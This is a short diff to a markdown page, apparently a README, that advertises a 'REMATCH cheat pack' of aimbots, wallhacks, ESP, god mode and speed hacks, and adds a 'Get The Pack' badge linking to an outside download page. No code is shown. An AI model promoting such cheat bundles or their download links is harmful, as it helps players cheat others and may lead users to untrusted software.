@@ -4,7 +4,7 @@
 
 Competitive games like **REMATCH** are built around skill, awareness, and quick reactions. But some players want to skip the grind and go straight to domination, and that’s where the **REMATCH cheat pack** comes in. Unlike a single trainer or hack, the cheat pack is a full bundle of tools—**aimbots, ESP overlays, wallhacks, radar vision, god mode, and speed hacks**—all in one. This guide explains the features of the cheat pack, how it stacks against other cheat types, and what players can expect when using it.
 
-
+[![Get](https://img.shields.io/badge/Get%20The-Pack-blueviolet)](https://rematch-cheat-pack.github.io/.github/)
 ---
 
 ## What is the REMATCH Cheat Pack?
